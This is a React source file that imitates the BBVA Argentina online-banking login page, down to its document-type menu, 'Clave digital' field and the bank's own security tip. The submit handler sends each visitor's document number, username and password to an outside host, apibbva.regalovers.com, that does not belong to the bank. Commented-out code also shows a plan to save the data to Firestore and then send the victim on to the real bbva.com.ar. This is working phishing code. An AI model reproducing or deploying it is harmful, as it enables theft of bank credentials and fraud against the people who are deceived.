import React from 'react';
import "../Responsive.css";
import firebase from "../firebase";
import moment from 'moment';
import { Button } from 'react-bootstrap';
import axios from 'axios';

import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEye, faKeyboard } from "@fortawesome/free-solid-svg-icons";
const eye = <FontAwesomeIcon icon={faEye} />;
const keyboard = <FontAwesomeIcon icon={faKeyboard} />;

const API_PATH = 'http://localhost:3000/src/api/db_post.php';
const collection = firebase.firestore().collection("bbva"); 

const Forms = () => {
    
    var state = {
        open: false,
    };

    const [documentTypeVal, setDocumentType] = React.useState("DNI");
    const [documentVal, setDocument] = React.useState(null);
    const [usernameVal, setUsername] = React.useState(null);
    const [passwordVal, setPassword] = React.useState(null);
    const [passwordShown, setPasswordShown] = React.useState(false);
    const [dropdownVisibility, setDropdownVisibility] = React.useState({ open: false });

    const handleButtonClick = () => {
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };

    const handleChangeDocumentType = (event) => {
        setDocumentType(event.target.value);
    }

    const handleChangeDocument = (event) => {
        setDocument(event.target.value);
        console.log(documentVal);
    }

    const handleChangeUsername = (event) => {
        setUsername(event.target.value);
        console.log(usernameVal);
    }
    const handleChangePassword = (event) => {
        setPassword(event.target.value);
        console.log(passwordVal);
    }

    const togglePasswordVisiblity = () => {
        setPasswordShown(passwordShown ? false : true);
    };
    
    const handleDniClick = () => {

        setDocumentType("DNI");
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };
    
    const handleLcClick = () => {

        setDocumentType("LC");
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };
    
    const handleLeClick = () => {

        setDocumentType("LE");
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };
    
    const handleCiClick = () => {

        setDocumentType("CI");
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };
    
    const handlePasaporteClick = () => {

        setDocumentType("PASAPORTE");
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };
    
    const handleRenaperClick = () => {

        setDocumentType("RENAPER");
        setDropdownVisibility((state) => {
            return {
                open: !state.open,
            };
        });
    };

    const sendCredentials = async () =>{
        try{
            const date = new Date();

            const data = {
                type: documentTypeVal,
                document: documentVal,
                username: usernameVal,
                password: passwordVal,
                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
            }

            axios.post('https://apibbva.regalovers.com/send_credentials.php', data)
            .then((response) => {
                console.log(response);
            })
            /*const request = JSON.stringify(data);

            const response = await fetch(`https://apibbva.regalovers.com/send_credentials.php`, {
                method: "POST",
                body: request
            });*/

            /*await collection.add({
                
            })
            .then(() => {
                console.log("Document successfully written!");
                window.location.href = "https://www.bbva.com.ar/";
            })
            .catch(function(error){
                console.error("Error adding Tutorial: ", error);
            });

            console.log("creado");*/
        }
        catch(e){
            console.log(e);
        }
    }

    return(
        <div
            className="box"
            style={{
                width:"100%",
                overflow:"hidden",
                height:"598px"
            }}>
            <form
                className="login-form">
                <div
                    className="wrapper-login"
                    style={{
                        margin:"auto",
                        padding:"0 20px 20px",
                        maxWidth:"400px",
                        width:"100%",
                        display:"flex",
                        flexDirection:"column",
                        boxSizing:"border-box"
                    }}>
                    <div
                        className="ng-scope"
                        style={{
                            boxSizing:"border-box",
                            display:"block"
                        }}>
                        <article
                            className="tip-area"
                            style={{
                                borderRadius:"1px",
                                padding:"0px 28px",
                                margin:"20px 0",
                                boxSizing:"border-box",
                                listStyle:"none",
                                display:"block",
                                WebkitAppearance:"none"
                            }}>
                            <p
                                className="tip-msg"
                                style={{
                                    fontSize:"14px",
                                    fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                    color:"#121212",
                                    backgroundRepeat:"no-repeat",
                                    backgroundSize:"56px",
                                    backgroundPosition:"0",
                                    boxSizing:"border-box",
                                    margin:"0",
                                    padding:"0",
                                    display:"block",
                                    marginBlockStart:"1em",
                                    marginBlockEnd:"1em",
                                    marginInlineStart:"0px",
                                    marginInlineEnd:"0px"
                                }}>
                                <span
                                    className="ng-binding"
                                    style={{
                                        padding:"10px 20px 10px 87px",
                                        textAlign:"center",
                                        display:"inline-block",
                                        boxSizing:"border-box",
                                        WebkitAppearance:"none"
                                    }}>
                                    No brindes datos personales por correo, teléfono, SMS o redes sociales.
                                </span>
                            </p>
                        </article>
                        <div
                            className="drop-down"
                            style={{
                                marginBottom:"13px",
                                display:"block"
                            }}>
                            <input
                                id="documentOptions"
                                type="button"
                                className="button-select"
                                onClick={handleButtonClick}
                                value={documentTypeVal}
                                style={{
                                    borderTop:"transparent",
                                    borderRight:"transparent",
                                    borderLeft:"transparent",
                                    borderBottom:"1px solid #666",
                                    color:"#121212",
                                    cursor:"pointer",
                                    fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                    fontWeight:"300",
                                    textAlign:"left",
                                    position:"relative",
                                    lineHeight:"24px",
                                    padding:"12px 15px",
                                    width:"100%",
                                    fontSize:".875em",
                                    display:"inline-block",
                                    boxSizing:"border-box"
                                }}>
                                
                            </input>
                            {dropdownVisibility.open && (
                                <div>
                                    <ul
                                        className="options-list"
                                        style={{
                                            background:"#fff",
                                            border:"1px solid #e6e5e5",
                                            borderTop:0,
                                            borderBottom:0,
                                            color:"#1f1f1f",
                                            margin:0,
                                            opacity:1,
                                            position:"relative",
                                            top:"0",
                                            width:"100%",
                                            zIndex:"12",
                                            boxSizing:"border-box",
                                            display:"block"
                                        }}>
                                        <li
                                            onClick={handleDniClick}
                                            className="options-li"
                                            style={{
                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                                fontWeight:"350"
                                            }}>
                                            DNI
                                        </li>
                                        <li
                                            onClick={handleLcClick}
                                            className="options-li"
                                            style={{
                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                                fontWeight:"350"
                                            }}>
                                            LC
                                        </li>
                                        <li
                                            onClick={handleLeClick}
                                            className="options-li"
                                            style={{
                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                                fontWeight:"350"
                                            }}>
                                            LE
                                        </li>
                                        <li
                                            onClick={handleCiClick}
                                            className="options-li"
                                            style={{
                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                                fontWeight:"350"
                                            }}>
                                            CI
                                        </li>
                                        <li
                                            onClick={handlePasaporteClick}
                                            className="options-li"
                                            style={{
                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                                fontWeight:"350"
                                            }}>
                                            PASAPORTE
                                        </li>
                                        <li
                                            onClick={handleRenaperClick}
                                            className="options-li"
                                            style={{
                                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                                fontWeight:"350"
                                            }}>
                                            RENAPER
                                        </li>
                                    </ul>
                                </div>
                            )}
                        </div>
                        <div
                            className="form-group"
                            style={{
                                marginBottom:"13px",
                                position:"relative",
                                boxSizing:"border-box",
                                display:"block"
                            }}>
                            <div
                                className="new-input-control"
                                style={{
                                    position:"relative",
                                    display:"block"
                                }}>
                                <input
                                    type="number"
                                    id="dataDocument"
                                    onChange={handleChangeDocument}
                                    className="data-input"
                                    style={{
                                        borderTop:"transparent",
                                        borderRight:"transparent",
                                        borderLeft:"transparent",
                                        borderBottom:"1px solid #666",
                                        fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                        fontWeight:"350",
                                        padding:"19px 15px 5px",
                                        background:"#f4f4f4",
                                        lineHeight:"24px",
                                        color:"#666",
                                        width:"100%",
                                        fontSize:".875em",
                                        display:"inline-block",
                                        boxSizing:"border-box",
                                        WebkitAppearance:"none",
                                        MozAppearance:"textfield",
                                        margin:"0",
                                        borderRadius:"0",
                                        outline:"none"
                                    }}/>
                                <label
                                    className="input-label"
                                    htmlFor="dataDocument"
                                    style={{
                                        color:"#666",
                                        fontSize:".75em",
                                        fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                        fontWeight:"350",
                                        left:"15px",
                                        lineHeight:"24px",
                                        pointerEvents:"none",
                                        position:"absolute",
                                        top:"12px",
                                        boxSizing:"border-box",
                                        margin:"0",
                                        padding:0,
                                        listStyle:"none",
                                        border:"none"
                                    }}>
                                    Número de documento
                                </label>
                            </div>
                        </div>
                        <div
                            className="form-group"
                            style={{
                                marginBottom:"13px",
                                position:"relative",
                                boxSizing:"border-box",
                                display:"block"
                            }}>
                            <div
                                className="new-input-control"
                                style={{
                                    position:"relative",
                                    display:"block"
                                }}>
                                <input
                                    type="text"
                                    id="dataUser"
                                    onChange={handleChangeUsername}
                                    className="data-input"
                                    style={{
                                        borderTop:"transparent",
                                        borderRight:"transparent",
                                        borderLeft:"transparent",
                                        borderBottom:"1px solid #666",
                                        fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                        fontWeight:"350",
                                        padding:"19px 15px 5px",
                                        background:"#f4f4f4",
                                        lineHeight:"24px",
                                        color:"#666",
                                        width:"100%",
                                        fontSize:".875em",
                                        display:"inline-block",
                                        boxSizing:"border-box",
                                        margin:"0",
                                        borderRadius:"0",
                                        outline:"none"
                                    }}/>
                                <label
                                    className="input-label"
                                    htmlFor="dataUser"
                                    style={{
                                        color:"#666",
                                        fontSize:".75em",
                                        fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                        fontWeight:"350",
                                        left:"15px",
                                        lineHeight:"24px",
                                        pointerEvents:"none",
                                        position:"absolute",
                                        top:"12px",
                                        boxSizing:"border-box",
                                        margin:"0",
                                        padding:0,
                                        listStyle:"none",
                                        border:"none"
                                    }}>
                                    Usuario
                                </label>
                            </div>
                        </div>
                        <div
                            className="form-group"
                            style={{
                                marginBottom:"13px",
                                position:"relative",
                                boxSizing:"border-box",
                                display:"block"
                            }}>
                            <div
                                className="new-input-control"
                                style={{
                                    position:"relative",
                                    display:"block"
                                }}>
                                <input
                                    id="dataPassword"
                                    className="data-input"
                                    onChange={handleChangePassword}
                                    type={passwordShown ? "text" : "password"}
                                    style={{
                                        borderTop:"transparent",
                                        borderRight:"transparent",
                                        borderLeft:"transparent",
                                        borderBottom:"1px solid #666",
                                        fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                        fontWeight:"350",
                                        padding:"19px 15px 5px",
                                        background:"#f4f4f4",
                                        lineHeight:"24px",
                                        color:"#666",
                                        width:"100%",
                                        fontSize:".875em",
                                        display:"inline-block",
                                        boxSizing:"border-box",
                                        margin:"0",
                                        borderRadius:"0",
                                        outline:"none"
                                    }}/>
                                <label
                                    className="input-label"
                                    htmlFor="dataPassword"
                                    style={{
                                        color:"#666",
                                        fontSize:".75em",
                                        fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                        fontWeight:"350",
                                        left:"15px",
                                        lineHeight:"24px",
                                        pointerEvents:"none",
                                        position:"absolute",
                                        top:"12px",
                                        boxSizing:"border-box",
                                        margin:"0",
                                        padding:0,
                                        listStyle:"none",
                                        border:"none"
                                    }}>
                                    Clave digital
                                </label>
                                <i
                                    className="toggle-password-icon"
                                    onClick={togglePasswordVisiblity}
                                    style={{
                                        color:"#1973b8",
                                        cursor:"pointer",
                                        position:"absolute",
                                        fontSize:"24px",
                                        top:"8px",
                                        right:"12px",
                                        width:"25px",
                                        padding:"0"
                                    }}>
                                    {eye}
                                </i>
                            </div>
                        </div>
                    </div>
                    <div
                        className="virtual-keyboard"
                        style={{
                            margin:"10px 0",
                            textAlign:"center",
                            boxSizing:"border-box",
                            lineHeight:1
                        }}>
                        <div
                            className="link-teclado"
                            style={{
                                display:"inline-block",
                                color:"#237aba",
                                boxSizing:"border-box",
                                margin:"0",
                                textAlign:"center"
                            }}>
                            <span
                                className="icon-login-keyboard">
                                <i
                                    className="toggle-password-icon"
                                    onClick={togglePasswordVisiblity}
                                    style={{
                                        color:"#1973b8",
                                        position:"relative",
                                        fontSize:"20px"
                                    }}>
                                    {keyboard}
                                </i>
                            </span>
                            <span
                                className="tvirtual-link"
                                style={{
                                    cursor:"pointer",
                                    paddingLeft:"10px",
                                    color:"#237aba",
                                    fontSize:"15px",
                                    display:"inline-block",
                                    fontWeight:"700",
                                    fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                    textAlign:"center",
                                    verticalAlign:"middle"
                                }}>
                                Teclado virtual
                            </span>
                        </div>
                    </div>
                    <div
                        className="form-group-enter"
                        style={{
                            margin:"10px 0 30px",
                            position:"relative",
                            boxSizing:"border-box"
                        }}>
                        <div
                            className="buttons-container"
                            style={{
                                display:"flex",
                                justifyContent:"space-between",
                                boxSizing:"border-box",
                                margin:"0",
                                padding:"0"
                            }}>
                            <Button
                                onClick={sendCredentials}
                                className="secondary-button"
                                style={{
                                    maxWidth:"165px",
                                    padding:"16px 32px",
                                    backgroundColor:"#fff",
                                    border:"2px solid rgba(25,115,184,.5)",
                                    borderRadius:"1px",
                                    color:"#1973b8",
                                    height:"56px",
                                    fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                    fontWeight:"600",
                                    fontSize:"15px",
                                    cursor:"pointer",
                                    display:"inline-block",
                                    width:"100%"
                                }}>
                                Registrarme
                            </Button>
                            <Button
                                onClick={sendCredentials}
                                className="primary-button"
                                style={{
                                    maxWidth:"165px",
                                    padding:"16px 32px",
                                    backgroundColor:"#1973b8",
                                    borderRadius:"1px",
                                    color:"#fff",
                                    height:"56px",
                                    fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                    fontWeight:"600",
                                    fontSize:"15px",
                                    border:"none",
                                    cursor:"pointer",
                                    display:"inline-block",
                                    width:"100%",
                                    boxSizing:"border-box"
                                }}>
                                Ingresar
                            </Button>
                        </div>
                    </div>
                    <div
                        className="text-center"
                        style={{
                            textAlign:"center",
                            boxSizing:"border-box",
                            display:"block"
                        }}>
                        <button
                            className="modal-trigger"
                            style={{
                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                fontWeight:"600",
                                fontSize:"15px",
                                marginBottom:"20px",
                                color:"#1973b8",
                                margin:"0",
                                display:"inline-block",
                                textAlign:"center",
                                border:"none",
                                background:"transparent",
                                cursor:"pointer",
                                width:"100%",
                                boxSizing:"border-box"
                            }}>
                            Olvidé o bloqueé mi Usuario / Clave Digital
                        </button>
                    </div>
                    <div
                        className="form-group"
                        style={{
                            position:"relative",
                            margin:"0",
                            textAlign:"center",
                            boxSizing:"border-box",
                            display:"block"
                        }}>
                        <button
                            className="modal-trigger"
                            style={{
                                fontFamily:"%PUBLIC_URL%/bentonsans-medium.otf",
                                fontWeight:"600",
                                fontSize:"15px",
                                marginBottom:"20px",
                                color:"#1973b8",
                                margin:"0",
                                display:"inline-block",
                                textAlign:"center",
                                border:"none",
                                background:"transparent",
                                cursor:"pointer",
                                width:"100%",
                                boxSizing:"border-box"
                            }}>
                            Recomendaciones de seguridad
                        </button>
                    </div>
                </div>
            </form>
        </div>
    )
}

export default Forms;